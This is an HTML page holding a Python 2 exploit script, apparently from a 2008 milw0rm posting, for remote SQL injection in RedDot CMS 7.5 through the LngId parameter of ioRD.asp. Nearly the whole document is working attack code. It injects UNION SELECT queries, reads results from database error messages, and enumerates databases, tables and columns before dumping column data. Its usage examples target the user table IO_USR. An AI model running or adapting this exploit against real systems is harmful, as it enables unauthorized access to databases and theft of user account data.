<html><head><title>RedDot CMS 7.5 (LngId) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/env python

# un-comment your selection.

import urllib2
import urllib
import string
import getopt
import sys

def banner():
	print
	print &quot;RED DOT CMS 7.5 database enumeration&quot;
	print &quot;by Mark Crowther and Rodrigo Marcos&quot;

def usage():
	print
	print &quot;usage():&quot;
	print &quot;python RD_POC.py [options] URL&quot;
	print
	print &quot; [options]&quot;
	print &quot;		--dbenum: Database enumeration&quot;
	print &quot;		--tableenum: Table enumeration, use -d to specify database&quot;
	print &quot;		--colenum: Column enumeration, use -d to specify database and -t to specify table&quot;
	print &quot;		--dataenum: Data enumeration, use -d to specify database, -t to specify table and -c to specify a column&quot;
	print &quot;		-d: Specify a database&quot;
	print &quot;		-t: Specify a table&quot;
	print &quot;		-c: Specify a column&quot;
	print &quot;		-h: Help page&quot;
	print
	print &quot;Examples: &quot;
	print &quot;		python RD_POC.py --dbenum http://myhost/cms/&quot;
	print &quot;		python RD_POC.py --tableenum -d IoAdministration http://myhost/cms/&quot;
	print &quot;		python RD_POC.py --colenum -d IoAdministration -t IO_USR http://myhost/cms/&quot;
	print &quot;		python RD_POC.py --dataenum -d IoAdministration -t IO_USR -c USR2 http://myhost/cms/&quot;
	print
	sys.exit()

def retrievedata(url1, url2 = &quot;' ORDER BY 1;-- &amp;DisableAutoLogin=1&quot;):
	stop = 0

	current = ''

	while (stop==0):

		request = url1 + current + url2

		request = string.replace(request, ' ', '%20')
		req = urllib2.Request(request)
		try:
			r = urllib2.urlopen(req)
		except urllib2.URLError, msg:
			print &quot;[+] Error: Error requesting URL (%s)&quot; % msg
		result = r.read()

		#print result
		if string.find(result, ' Description  Conversion failed when converting the ') == -1:
			stop = 1
		else:
			start = string.find(result, &quot;'&quot;) + 1
			end = string.find(result[start:], &quot;'&quot;) + start
			current = result[start:end]
			print current


def dbenum():

	retrievedata(url + &quot;/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYS.SYSDATABASES where name&gt; '&quot;)

def tableenum(database=''):

	if database=='':
		retrievedata(url + &quot;/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYSOBJECTS where xtype=char(85) and name&gt; '&quot;)

	else:
		retrievedata(url + &quot;/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM &quot; + database + &quot;..SYSOBJECTS where xtype=char(85) and name&gt; '&quot;)

def colenum(table, database=''):

	if table=='':
		usage()

	if database=='':
		retrievedata(url + &quot;/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYSCOLUMNS where name &gt; '&quot;, &quot;' AND id = (SELECT id from SYSOBJECTS WHERE name= '&quot; + table + &quot;') ORDER BY 1;-- &amp;DisableAutoLogin=1&quot;)
	else:
		retrievedata(url + &quot;/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM &quot; + database + &quot;..SYSCOLUMNS where name &gt; '&quot;,&quot;' AND id = (SELECT id from &quot; + database + &quot;..SYSOBJECTS WHERE name= '&quot; + table + &quot;') ORDER BY 1;-- &amp;DisableAutoLogin=1&quot;)


def dataenum(column, table, database=''):

	if column=='' or table=='':
		usage()

	if database=='':
		retrievedata(url + &quot;/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT MIN(&quot; + column + &quot;) FROM &quot; + table + &quot; WHERE &quot; + column + &quot;&gt; '&quot;)
	
	else:
		retrievedata(url + &quot;/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT MIN(&quot; + column + &quot;) FROM &quot; + database + &quot;..&quot; + table + &quot; WHERE &quot; + column + &quot;&gt; '&quot;)


banner()
pdbenum = 0
ptableenum = 0
pcolenum = 0
pdataenum = 0
database = ''
table = ''
column = ''

url =  sys.argv[len(sys.argv)-1]

try:
	opts, args = getopt.getopt(sys.argv[1:], &quot;d:t:c:h:&quot;, [&quot;help&quot;, &quot;dbenum&quot;, &quot;tableenum&quot;, &quot;colenum&quot;, &quot;dataenum&quot;])
except getopt.GetoptError:
	usage()

try:
	for o, a in opts:
		if o in (&quot;-h&quot;, &quot;--help&quot;):
			usage()
		if o == &quot;--dbenum&quot;:
			pdbenum = 1
		if o == &quot;--tableenum&quot;:
			ptableenum = 1
		if o == &quot;--colenum&quot;:
			pcolenum = 1
		if o == &quot;--dataenum&quot;:
			pdataenum = 1
		if o == &quot;-d&quot;:
			database = a
		if o == &quot;-t&quot;:
			table = a
		if o == &quot;-c&quot;:
			column = a
except:
	usage()


if pdbenum == 1:
	print 'Enumerating databases:'
	dbenum()
elif ptableenum == 1:
	print 'Enumerating tables:'
	tableenum(database)
elif pcolenum == 1:
	print 'Enumerating columns:'
	colenum(table, database)
elif pdataenum == 1:
	print 'Enumerating data:'
	dataenum(column, table, database)
else:
	usage()

# milw0rm.com [2008-04-21]</pre></html>